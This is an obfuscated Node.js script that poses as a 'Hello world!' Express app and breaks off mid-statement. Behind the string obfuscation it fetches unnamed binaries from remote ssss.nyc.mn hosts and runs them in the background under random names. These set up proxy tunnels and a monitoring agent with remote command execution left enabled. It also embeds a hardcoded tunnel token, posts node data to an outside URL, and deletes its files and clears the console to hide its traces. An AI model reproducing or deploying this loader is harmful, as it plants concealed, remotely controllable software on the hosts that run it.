const _0xddffa5=_0x3a7f;(function(_0x7ef6cf,_0x357c3a){const _0x5ac571=_0x3a7f,_0x1d92eb=_0x7ef6cf();while(!![]){try{const _0x4334ea=-parseInt(_0x5ac571(0x118))/0x1+-parseInt(_0x5ac571(0x100))/0x2+parseInt(_0x5ac571(0x15c))/0x3+parseInt(_0x5ac571(0x19e))/0x4+parseInt(_0x5ac571(0x167))/0x5*(-parseInt(_0x5ac571(0x11e))/0x6)+-parseInt(_0x5ac571(0x17b))/0x7*(-parseInt(_0x5ac571(0x145))/0x8)+-parseInt(_0x5ac571(0x124))/0x9*(-parseInt(_0x5ac571(0x132))/0xa);if(_0x4334ea===_0x357c3a)break;else _0x1d92eb['push'](_0x1d92eb['shift']());}catch(_0x4cd375){_0x1d92eb['push'](_0x1d92eb['shift']());}}}(_0x3ba1,0x427aa));const express=require(_0xddffa5(0xe6)),app=express(),axios=require(_0xddffa5(0x11d)),os=require('os'),fs=require('fs'),path=require(_0xddffa5(0x131)),{promisify}=require(_0xddffa5(0x19a)),exec=promisify(require('child_process')['exec']),{execSync}=require(_0xddffa5(0xf6)),UPLOAD_URL=process[_0xddffa5(0x109)][_0xddffa5(0x198)]||'',PROJECT_URL=process[_0xddffa5(0x109)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0xddffa5(0x109)][_0xddffa5(0xf5)]||![],FILE_PATH=process[_0xddffa5(0x109)]['FILE_PATH']||_0xddffa5(0x163),SUB_PATH=process[_0xddffa5(0x109)]['SUB_PATH']||_0xddffa5(0xe5),PORT=process[_0xddffa5(0x109)]['SERVER_PORT']||process['env'][_0xddffa5(0x19c)]||0xbb8,UUID=process[_0xddffa5(0x109)][_0xddffa5(0x12d)]||_0xddffa5(0xff),NEZHA_SERVER=process[_0xddffa5(0x109)][_0xddffa5(0xdc)]||'',NEZHA_PORT=process[_0xddffa5(0x109)][_0xddffa5(0x129)]||'',NEZHA_KEY=process[_0xddffa5(0x109)][_0xddffa5(0x11b)]||'',ARGO_DOMAIN=process[_0xddffa5(0x109)][_0xddffa5(0x15a)]||_0xddffa5(0x170),ARGO_AUTH=process[_0xddffa5(0x109)][_0xddffa5(0xdf)]||_0xddffa5(0x1a0),ARGO_PORT=process[_0xddffa5(0x109)][_0xddffa5(0x153)]||0x1f41,CFIP=process['env'][_0xddffa5(0x14b)]||_0xddffa5(0xfe),CFPORT=process['env'][_0xddffa5(0x139)]||0x1bb,NAME=process['env'][_0xddffa5(0x189)]||_0xddffa5(0xfd);!fs[_0xddffa5(0x133)](FILE_PATH)?(fs[_0xddffa5(0x15e)](FILE_PATH),console[_0xddffa5(0x10e)](FILE_PATH+_0xddffa5(0x101))):console[_0xddffa5(0x10e)](FILE_PATH+_0xddffa5(0x157));function generateRandomName(){const _0x65ffbd=_0xddffa5,_0x4bf310=_0x65ffbd(0xdb);let _0x195fa7='';for(let _0x29c785=0x0;_0x29c785<0x6;_0x29c785++){_0x195fa7+=_0x4bf310['charAt'](Math[_0x65ffbd(0x146)](Math[_0x65ffbd(0x142)]()*_0x4bf310[_0x65ffbd(0x12b)]));}return _0x195fa7;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0xddffa5(0x111)](FILE_PATH,phpName),webPath=path[_0xddffa5(0x111)](FILE_PATH,webName),botPath=path[_0xddffa5(0x111)](FILE_PATH,botName),subPath=path[_0xddffa5(0x111)](FILE_PATH,_0xddffa5(0x14c)),listPath=path[_0xddffa5(0x111)](FILE_PATH,_0xddffa5(0x150)),bootLogPath=path[_0xddffa5(0x111)](FILE_PATH,_0xddffa5(0x162)),configPath=path[_0xddffa5(0x111)](FILE_PATH,'config.json');function _0x3ba1(){const _0x3959d1=['Empowerment\x20success\x20for\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','CFIP','sub.txt','match','\x22\x20>\x20/dev/null\x202>&1','web\x20running\x20error:\x20','list.txt','chmod','--tls','ARGO_PORT','Skipping\x20adding\x20automatic\x20access\x20task','2096','ARGO_DOMAIN:','\x20already\x20exists','Unhandled\x20error\x20in\x20startserver:','send','ARGO_DOMAIN','\x20-p\x20','314439wuGPzW','taskkill\x20/f\x20/im\x20','mkdirSync','tunnel.json','base64','https://amd64.ssss.nyc.mn/bot','boot.log','./tmp','8443','443','https://ipapi.co/json/','241370oHcYiD','none','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','Error\x20in\x20startserver:','?encryption=none&security=tls&sni=','finish','error','https://arm64.ssss.nyc.mn/web','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','liuda.565498.xyz','unlinkSync','includes','\x20>/dev/null\x202>&1\x20&','utf-8','http','tcp','vless','https+local://8.8.8.8/dns-query','has','push','1694882gLhDfS','rm\x20-rf\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','amd','trojan','org','?security=tls&sni=','\x0a\x20\x20credentials-file:\x20','unshift','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','catch','platform','config.json','writeFileSync','NAME','createWriteStream','/vmess-argo','country_code','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','get','close','then','data','\x20-c\x20','blackhole','nohup\x20','statSync','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','https://arm64.ssss.nyc.mn/agent','UPLOAD_URL','win32','util','fileName','PORT','unlink','397788BXrsDN','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','eyJhIjoiYzczMmM0YzU0MDIwOGE2OGJhODg3YjI1N2Y3NDQ1YWUiLCJ0IjoiNjA3NDIxMmEtYjgzNi00ZDgyLTgyNzMtNjEwMzBjMWQ4Mjk3IiwicyI6IlptTmlOVFE0WldNdE1qUmxOeTAwWldGaUxUZzNaakl0TkRnMU5qSmxaVFJqTURKaCJ9','forEach','Hello\x20world!','readFileSync','/trojan-argo','abcdefghijklmnopqrstuvwxyz','NEZHA_SERVER','filter','success','ARGO_AUTH','\x20-c\x20\x22','response','arm64','\x0a\x0avmess://','basename','sub','express','config.yaml','xtls-rprx-vision','2083','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','text/plain;\x20charset=utf-8','Content-Type','Empowerment\x20failed\x20for\x20','status','del\x20/f\x20/q\x20','true','countryCode','isFile','TunnelSecret','freedom','AUTO_ACCESS','child_process','test','/vless-argo','quic','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','2053','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','xiaoli','cdns.doon.eu.org','0cab0e33-c930-4ce9-acd0-8e95037d0f70','958434HHDNbi','\x20is\x20created','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x0a\x20\x20\x20\x20','application/json','Error\x20executing\x20command:\x20','message','&fp=firefox&type=ws&host=','toString','env','false','/config.json\x20>/dev/null\x202>&1\x20&','\x0avless://','https://amd64.ssss.nyc.mn/web','log','clear','stream','join','\x20failed:\x20','tunnel.yml','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','/tunnel.yml\x20run','\x20successfully','Subscription\x20uploaded\x20successfully','375532MbhEwx','\x20-s\x20','fileUrl','NEZHA_KEY','arm','axios','36pRFyQO','App\x20is\x20running','http\x20server\x20is\x20running\x20on\x20port:','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','https://arm64.ssss.nyc.mn/bot','post','945yIoEOQ','pkill\x20-f\x20\x22[','2087','/vmess-argo?ed=2560','Unknown','NEZHA_PORT','tls','length','Error\x20downloading\x20files:','UUID','pipe','\x0a\x20\x20tunnel:\x20','http://ip-api.com/json/','path','92410nDPsGx','existsSync','from','/dev/null','&path=%2Fvless-argo%3Fed%3D2560#','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','split','CFPORT','\x20is\x20running','ArgoDomain:','\x0aclient_secret:\x20','/api/delete-nodes','block','/sub.txt\x20saved\x20successfully','vmess','/api/add-subscriptions','random','stringify','&path=%2Ftrojan-argo%3Fed%3D2560#','8caLxjQ','floor','127.0.0.1','Download\x20'];_0x3ba1=function(){return _0x3959d1;};return _0x3ba1();}function deleteNodes(){const _0x2d3262=_0xddffa5;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x25e800;try{_0x25e800=fs['readFileSync'](subPath,_0x2d3262(0x174));}catch{return null;}const _0x432a71=Buffer[_0x2d3262(0x134)](_0x25e800,_0x2d3262(0x160))[_0x2d3262(0x108)](_0x2d3262(0x174)),_0x4fc2e6=_0x432a71[_0x2d3262(0x138)]('\x0a')['filter'](_0x2acd26=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2d3262(0xf7)](_0x2acd26));if(_0x4fc2e6[_0x2d3262(0x12b)]===0x0)return;return axios[_0x2d3262(0x123)](UPLOAD_URL+_0x2d3262(0x13d),JSON['stringify']({'nodes':_0x4fc2e6}),{'headers':{'Content-Type':_0x2d3262(0x104)}})['catch'](_0x162d11=>{return null;}),null;}catch(_0x508bed){return null;}}function _0x3a7f(_0x15a36c,_0x270032){_0x15a36c=_0x15a36c-0xdb;const _0x3ba146=_0x3ba1();let _0x3a7f90=_0x3ba146[_0x15a36c];return _0x3a7f90;}function cleanupOldFiles(){const _0x5af21b=_0xddffa5;try{const _0x33cea4=fs['readdirSync'](FILE_PATH);_0x33cea4[_0x5af21b(0x1a1)](_0x20f499=>{const _0x364307=_0x5af21b,_0x59eb24=path[_0x364307(0x111)](FILE_PATH,_0x20f499);try{const _0x1656f0=fs[_0x364307(0x195)](_0x59eb24);_0x1656f0[_0x364307(0xf2)]()&&fs[_0x364307(0x171)](_0x59eb24);}catch(_0x5469af){}});}catch(_0x191aa2){}}app['get']('/',function(_0x29d5a5,_0x3ad454){const _0x374a66=_0xddffa5;_0x3ad454[_0x374a66(0x159)](_0x374a66(0x1a2));});async function generateConfig(){const _0x1c4427=_0xddffa5,_0x2f5792={'log':{'access':_0x1c4427(0x135),'error':_0x1c4427(0x135),'loglevel':_0x1c4427(0x168)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1c4427(0x177),'settings':{'clients':[{'id':UUID,'flow':_0x1c4427(0xe8)}],'decryption':_0x1c4427(0x168),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x1c4427(0x18b),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x1c4427(0x176)}},{'port':0xbb9,'listen':_0x1c4427(0x147),'protocol':_0x1c4427(0x177),'settings':{'clients':[{'id':UUID}],'decryption':_0x1c4427(0x168)},'streamSettings':{'network':'tcp','security':_0x1c4427(0x168)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x1c4427(0x177),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x1c4427(0x168)},'streamSettings':{'network':'ws','security':_0x1c4427(0x168),'wsSettings':{'path':_0x1c4427(0xf8)}},'sniffing':{'enabled':!![],'destOverride':[_0x1c4427(0x175),_0x1c4427(0x12a),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x1c4427(0x147),'protocol':_0x1c4427(0x140),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x1c4427(0x18b)}},'sniffing':{'enabled':!![],'destOverride':[_0x1c4427(0x175),_0x1c4427(0x12a),_0x1c4427(0xf9)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x1c4427(0x17f),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x1c4427(0x168),'wsSettings':{'path':_0x1c4427(0x1a4)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x1c4427(0x12a),_0x1c4427(0xf9)],'metadataOnly':![]}}],'dns':{'servers':[_0x1c4427(0x178)]},'outbounds':[{'protocol':_0x1c4427(0xf4),'tag':'direct'},{'protocol':_0x1c4427(0x193),'tag':_0x1c4427(0x13e)}]};fs[_0x1c4427(0x188)](path[_0x1c4427(0x111)](FILE_PATH,_0x1c4427(0x187)),JSON[_0x1c4427(0x143)](_0x2f5792,null,0x2));}function getSystemArchitecture(){const _0x21150f=_0xddffa5,_0x3db6f8=os['arch']();return _0x3db6f8==='arm'||_0x3db6f8===_0x21150f(0xe2)||_0x3db6f8==='aarch64'?_0x21150f(0x11c):_0x21150f(0x17e);}function downloadFile(_0x2a3830,_0x6e32d5,_0x3998a4){const _0x9b220=_0xddffa5,_0x3c360c=_0x2a3830;!fs[_0x9b220(0x133)](FILE_PATH)&&fs[_0x9b220(0x15e)](FILE_PATH,{'recursive':!![]});const _0x3b36a9=fs[_0x9b220(0x18a)](_0x3c360c);axios({'method':_0x9b220(0x18e),'url':_0x6e32d5,'responseType':_0x9b220(0x110)})[_0x9b220(0x190)](_0x2d265c=>{const _0x481b74=_0x9b220;_0x2d265c[_0x481b74(0x191)][_0x481b74(0x12e)](_0x3b36a9),_0x3b36a9['on'](_0x481b74(0x16c),()=>{const _0xe63f5d=_0x481b74;_0x3b36a9[_0xe63f5d(0x18f)](),console[_0xe63f5d(0x10e)]('Download\x20'+path[_0xe63f5d(0xe4)](_0x3c360c)+_0xe63f5d(0x116)),_0x3998a4(null,_0x3c360c);}),_0x3b36a9['on'](_0x481b74(0x16d),_0x30c8c3=>{const _0x12806f=_0x481b74;fs[_0x12806f(0x19d)](_0x3c360c,()=>{});const _0x1db7fc=_0x12806f(0x148)+path[_0x12806f(0xe4)](_0x3c360c)+_0x12806f(0x112)+_0x30c8c3['message'];console['error'](_0x1db7fc),_0x3998a4(_0x1db7fc);});})[_0x9b220(0x185)](_0x3e7c55=>{const _0x3fd1ce=_0x9b220,_0x293fe2=_0x3fd1ce(0x148)+path[_0x3fd1ce(0xe4)](_0x3c360c)+'\x20failed:\x20'+_0x3e7c55['message'];console['error'](_0x293fe2),_0x3998a4(_0x293fe2);});}async function downloadFilesAndRun(){const _0x307dc2=_0xddffa5,_0x35a257=getSystemArchitecture(),_0x3a9e6b=getFilesForArchitecture(_0x35a257);if(_0x3a9e6b[_0x307dc2(0x12b)]===0x0){console[_0x307dc2(0x10e)](_0x307dc2(0x114));return;}const _0x3ab5c9=_0x3a9e6b['map'](_0x42201b=>{return new Promise((_0x49f999,_0x328554)=>{const _0x231f87=_0x3a7f;downloadFile(_0x42201b[_0x231f87(0x19b)],_0x42201b[_0x231f87(0x11a)],(_0x4e3ec4,_0x20c903)=>{_0x4e3ec4?_0x328554(_0x4e3ec4):_0x49f999(_0x20c903);});});});try{await Promise['all'](_0x3ab5c9);}catch(_0x33d1ce){console[_0x307dc2(0x16d)](_0x307dc2(0x12c),_0x33d1ce);return;}function _0x214180(_0x4a21e6){const _0x44613f=_0x307dc2,_0x5b6af5=0x1fd;_0x4a21e6[_0x44613f(0x1a1)](_0x2b0724=>{const _0x8a3ac2=_0x44613f;fs[_0x8a3ac2(0x133)](_0x2b0724)&&fs[_0x8a3ac2(0x151)](_0x2b0724,_0x5b6af5,_0x1d9e2a=>{const _0x56f8da=_0x8a3ac2;_0x1d9e2a?console[_0x56f8da(0x16d)](_0x56f8da(0xed)+_0x2b0724+':\x20'+_0x1d9e2a):console[_0x56f8da(0x10e)](_0x56f8da(0x149)+_0x2b0724+':\x20'+_0x5b6af5[_0x56f8da(0x108)](0x8));});});}const _0x378cd4=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x214180(_0x378cd4);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3654c4=NEZHA_SERVER[_0x307dc2(0x172)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x46ed74=new Set(['443',_0x307dc2(0x164),_0x307dc2(0x155),_0x307dc2(0x126),_0x307dc2(0xe9),_0x307dc2(0xfb)]),_0x285c3a=_0x46ed74[_0x307dc2(0x179)](_0x3654c4)?_0x307dc2(0xf0):_0x307dc2(0x10a),_0x239af4=_0x307dc2(0x13c)+NEZHA_KEY+_0x307dc2(0xea)+NEZHA_SERVER+_0x307dc2(0xfa)+_0x285c3a+_0x307dc2(0x121)+UUID;fs[_0x307dc2(0x188)](path['join'](FILE_PATH,_0x307dc2(0xe7)),_0x239af4);const _0x5d1f5d=_0x307dc2(0x194)+phpPath+_0x307dc2(0xe0)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x5d1f5d),console[_0x307dc2(0x10e)](phpName+_0x307dc2(0x13a)),await new Promise(_0x29724d=>setTimeout(_0x29724d,0x3e8));}catch(_0x2708ef){console[_0x307dc2(0x16d)]('php\x20running\x20error:\x20'+_0x2708ef);}}else{let _0x3f9fe8='';const _0xa5665d=[_0x307dc2(0x165),_0x307dc2(0x164),_0x307dc2(0x155),'2087','2083','2053'];_0xa5665d['includes'](NEZHA_PORT)&&(_0x3f9fe8=_0x307dc2(0x152));const _0x3d60bd=_0x307dc2(0x194)+npmPath+_0x307dc2(0x119)+NEZHA_SERVER+':'+NEZHA_PORT+_0x307dc2(0x15b)+NEZHA_KEY+'\x20'+_0x3f9fe8+_0x307dc2(0x19f);try{await exec(_0x3d60bd),console['log'](npmName+'\x20is\x20running'),await new Promise(_0x46d1f2=>setTimeout(_0x46d1f2,0x3e8));}catch(_0x4052ca){console[_0x307dc2(0x16d)]('npm\x20running\x20error:\x20'+_0x4052ca);}}}else console['log'](_0x307dc2(0x17d));const _0x128f2b=_0x307dc2(0x194)+webPath+_0x307dc2(0x192)+FILE_PATH+_0x307dc2(0x10b);try{await exec(_0x128f2b),console[_0x307dc2(0x10e)](webName+_0x307dc2(0x13a)),await new Promise(_0x4fc49a=>setTimeout(_0x4fc49a,0x3e8));}catch(_0x49a73d){console['error'](_0x307dc2(0x14f)+_0x49a73d);}if(fs[_0x307dc2(0x133)](botPath)){let _0x1495f2;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x1495f2='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x307dc2(0x14d)](/TunnelSecret/)?_0x1495f2=_0x307dc2(0x102)+FILE_PATH+_0x307dc2(0x115):_0x1495f2=_0x307dc2(0xfc)+FILE_PATH+_0x307dc2(0x14a)+ARGO_PORT;try{await exec(_0x307dc2(0x194)+botPath+'\x20'+_0x1495f2+_0x307dc2(0x173)),console[_0x307dc2(0x10e)](botName+_0x307dc2(0x13a)),await new Promise(_0x44bb2e=>setTimeout(_0x44bb2e,0x7d0));}catch(_0x2866b3){console[_0x307dc2(0x16d)](_0x307dc2(0x105)+_0x2866b3);}}await new Promise(_0x4e4712=>setTimeout(_0x4e4712,0x1388));}function getFilesForArchitecture(_0x2c6de5){const _0x505fe1=_0xddffa5;let _0x12970d;_0x2c6de5==='arm'?_0x12970d=[{'fileName':webPath,'fileUrl':_0x505fe1(0x16e)},{'fileName':botPath,'fileUrl':_0x505fe1(0x122)}]:_0x12970d=[{'fileName':webPath,'fileUrl':_0x505fe1(0x10d)},{'fileName':botPath,'fileUrl':_0x505fe1(0x161)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3e012d=_0x2c6de5===_0x505fe1(0x11c)?_0x505fe1(0x197):'https://amd64.ssss.nyc.mn/agent';_0x12970d['unshift']({'fileName':npmPath,'fileUrl':_0x3e012d});}else{const _0x5b4e18=_0x2c6de5===_0x505fe1(0x11c)?'https://arm64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/v1';_0x12970d[_0x505fe1(0x183)]({'fileName':phpPath,'fileUrl':_0x5b4e18});}}return _0x12970d;}function argoType(){const _0x509a6e=_0xddffa5;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x509a6e(0x16f));return;}if(ARGO_AUTH[_0x509a6e(0x172)](_0x509a6e(0xf3))){fs[_0x509a6e(0x188)](path[_0x509a6e(0x111)](FILE_PATH,_0x509a6e(0x15f)),ARGO_AUTH);const _0x432c2c=_0x509a6e(0x12f)+ARGO_AUTH[_0x509a6e(0x138)]('\x22')[0xb]+_0x509a6e(0x182)+path[_0x509a6e(0x111)](FILE_PATH,_0x509a6e(0x15f))+_0x509a6e(0x169)+ARGO_DOMAIN+_0x509a6e(0x184)+ARGO_PORT+_0x509a6e(0x137);fs['writeFileSync'](path[_0x509a6e(0x111)](FILE_PATH,_0x509a6e(0x113)),_0x432c2c);}else console['log'](_0x509a6e(0x18d));}async function extractDomains(){const _0x14331d=_0xddffa5;let _0x1645c9;if(ARGO_AUTH&&ARGO_DOMAIN)_0x1645c9=ARGO_DOMAIN,console[_0x14331d(0x10e)](_0x14331d(0x156),_0x1645c9),await _0x1c37c5(_0x1645c9);else try{const _0x2c3b92=fs[_0x14331d(0x1a3)](path[_0x14331d(0x111)](FILE_PATH,'boot.log'),_0x14331d(0x174)),_0x2e4bd4=_0x2c3b92['split']('\x0a'),_0x46660d=[];_0x2e4bd4[_0x14331d(0x1a1)](_0x4dd1a1=>{const _0x38c2b4=_0x14331d,_0x5fefeb=_0x4dd1a1[_0x38c2b4(0x14d)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5fefeb){const _0x4d37d4=_0x5fefeb[0x1];_0x46660d[_0x38c2b4(0x17a)](_0x4d37d4);}});if(_0x46660d[_0x14331d(0x12b)]>0x0)_0x1645c9=_0x46660d[0x0],console[_0x14331d(0x10e)](_0x14331d(0x13b),_0x1645c9),await _0x1c37c5(_0x1645c9);else{console[_0x14331d(0x10e)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x14331d(0x171)](path['join'](FILE_PATH,'boot.log'));async function _0x298afe(){const _0x1d85e4=_0x14331d;try{process[_0x1d85e4(0x186)]===_0x1d85e4(0x199)?await exec(_0x1d85e4(0x15d)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x1d85e4(0x125)+botName['charAt'](0x0)+']'+botName['substring'](0x1)+_0x1d85e4(0x14e));}catch(_0x5256d3){}}_0x298afe(),await new Promise(_0x59418b=>setTimeout(_0x59418b,0xbb8));const _0x1f387d=_0x14331d(0xfc)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x1f387d+'\x20>/dev/null\x202>&1\x20&'),console[_0x14331d(0x10e)](botName+_0x14331d(0x13a)),await new Promise(_0x110bb=>setTimeout(_0x110bb,0xbb8)),await extractDomains();}catch(_0xe5ec8e){console[_0x14331d(0x16d)](_0x14331d(0x105)+_0xe5ec8e);}}}catch(_0xaefe0d){console[_0x14331d(0x16d)]('Error\x20reading\x20boot.log:',_0xaefe0d);}async function _0x17d751(){const _0x5f4744=_0x14331d;try{const _0x16b76d=await axios[_0x5f4744(0x18e)](_0x5f4744(0x166),{'timeout':0xbb8});if(_0x16b76d[_0x5f4744(0x191)]&&_0x16b76d[_0x5f4744(0x191)][_0x5f4744(0x18c)]&&_0x16b76d['data'][_0x5f4744(0x180)])return _0x16b76d[_0x5f4744(0x191)][_0x5f4744(0x18c)]+'_'+_0x16b76d[_0x5f4744(0x191)][_0x5f4744(0x180)];}catch(_0x383cdb){try{const _0x256f00=await axios['get'](_0x5f4744(0x130),{'timeout':0xbb8});if(_0x256f00[_0x5f4744(0x191)]&&_0x256f00['data'][_0x5f4744(0xee)]===_0x5f4744(0xde)&&_0x256f00[_0x5f4744(0x191)][_0x5f4744(0xf1)]&&_0x256f00[_0x5f4744(0x191)]['org'])return _0x256f00[_0x5f4744(0x191)][_0x5f4744(0xf1)]+'_'+_0x256f00[_0x5f4744(0x191)][_0x5f4744(0x180)];}catch(_0x176842){}}return _0x5f4744(0x128);}async function _0x1c37c5(_0x51b552){const _0x3c17fb=await _0x17d751(),_0x4e209a=NAME?NAME+'-'+_0x3c17fb:_0x3c17fb;return new Promise(_0x5ae70b=>{setTimeout(()=>{const _0x1c376e=_0x3a7f,_0x3610cf={'v':'2','ps':''+_0x4e209a,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x1c376e(0x168),'host':_0x51b552,'path':_0x1c376e(0x127),'tls':_0x1c376e(0x12a),'sni':_0x51b552,'alpn':'','fp':'firefox'},_0x2ed837=_0x1c376e(0x10c)+UUID+'@'+CFIP+':'+CFPORT+_0x1c376e(0x16b)+_0x51b552+_0x1c376e(0x107)+_0x51b552+_0x1c376e(0x136)+_0x4e209a+_0x1c376e(0xe3)+Buffer[_0x1c376e(0x134)](JSON[_0x1c376e(0x143)](_0x3610cf))[_0x1c376e(0x108)](_0x1c376e(0x160))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x1c376e(0x181)+_0x51b552+_0x1c376e(0x107)+_0x51b552+_0x1c376e(0x144)+_0x4e209a+_0x1c376e(0x103);console[_0x1c376e(0x10e)](Buffer[_0x1c376e(0x134)](_0x2ed837)['toString']('base64')),fs['writeFileSync'](subPath,Buffer[_0x1c376e(0x134)](_0x2ed837)[_0x1c376e(0x108)](_0x1c376e(0x160))),console[_0x1c376e(0x10e)](FILE_PATH+_0x1c376e(0x13f)),uploadNodes(),app[_0x1c376e(0x18e)]('/'+SUB_PATH,(_0x33c303,_0x4acc34)=>{const _0x4eb132=_0x1c376e,_0x13b711=Buffer[_0x4eb132(0x134)](_0x2ed837)[_0x4eb132(0x108)](_0x4eb132(0x160));_0x4acc34['set'](_0x4eb132(0xec),_0x4eb132(0xeb)),_0x4acc34[_0x4eb132(0x159)](_0x13b711);}),_0x5ae70b(_0x2ed837);},0x7d0);});}}async function uploadNodes(){const _0x6bb74d=_0xddffa5;if(UPLOAD_URL&&PROJECT_URL){const _0x52feb9=PROJECT_URL+'/'+SUB_PATH,_0x1e260e={'subscription':[_0x52feb9]};try{const _0x2ee341=await axios['post'](UPLOAD_URL+_0x6bb74d(0x141),_0x1e260e,{'headers':{'Content-Type':_0x6bb74d(0x104)}});return _0x2ee341&&_0x2ee341[_0x6bb74d(0xee)]===0xc8?(console[_0x6bb74d(0x10e)](_0x6bb74d(0x117)),_0x2ee341):null;}catch(_0x2deda6){if(_0x2deda6[_0x6bb74d(0xe1)]){if(_0x2deda6[_0x6bb74d(0xe1)][_0x6bb74d(0xee)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x6bb74d(0x133)](listPath))return;const _0xe5c35a=fs['readFileSync'](listPath,_0x6bb74d(0x174)),_0x245e42=_0xe5c35a[_0x6bb74d(0x138)]('\x0a')[_0x6bb74d(0xdd)](_0x15377a=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x6bb74d(0xf7)](_0x15377a));if(_0x245e42[_0x6bb74d(0x12b)]===0x0)return;const _0x35badd=JSON['stringify']({'nodes':_0x245e42});try{const _0x245b91=await axios[_0x6bb74d(0x123)](UPLOAD_URL+'/api/add-nodes',_0x35badd,{'headers':{'Content-Type':'application/json'}});return _0x245b91&&_0x245b91['status']===0xc8?(console[_0x6bb74d(0x10e)]('Nodes\x20uploaded\x20successfully'),_0x245b91):null;}catch(_0x45c323){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x47a25c=_0x3a7f,_0x28e0c5=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x28e0c5[_0x47a25c(0x17a)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x28e0c5[_0x47a25c(0x17a)](phpPath);process['platform']===_0x47a25c(0x199)?exec(_0x47a25c(0xef)+_0x28e0c5[_0x47a25c(0x111)]('\x20')+'\x20>\x20nul\x202>&1',_0x5f6578=>{const _0x24b8c8=_0x47a25c;console[_0x24b8c8(0x10f)](),console[_0x24b8c8(0x10e)](_0x24b8c8(0x11f)),console['log'](_0x24b8c8(0x196));}):exec(_0x47a25c(0x17c)+_0x28e0c5[_0x47a25c(0x111)]('\x20')+'\x20>/dev/null\x202>&1',_0x4692c6=>{const _0x4217bf=_0x47a25c;console[_0x4217bf(0x10f)](),console[_0x4217bf(0x10e)]('App\x20is\x20running'),console[_0x4217bf(0x10e)](_0x4217bf(0x196));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x107068=_0xddffa5;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x107068(0x154));return;}try{const _0x2b7202=await axios[_0x107068(0x123)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x107068(0x10e)]('automatic\x20access\x20task\x20added\x20successfully'),_0x2b7202;}catch(_0x2b199b){return console[_0x107068(0x16d)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x2b199b[_0x107068(0x106)]),null;}}async function startserver(){const _0x5384ed=_0xddffa5;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await 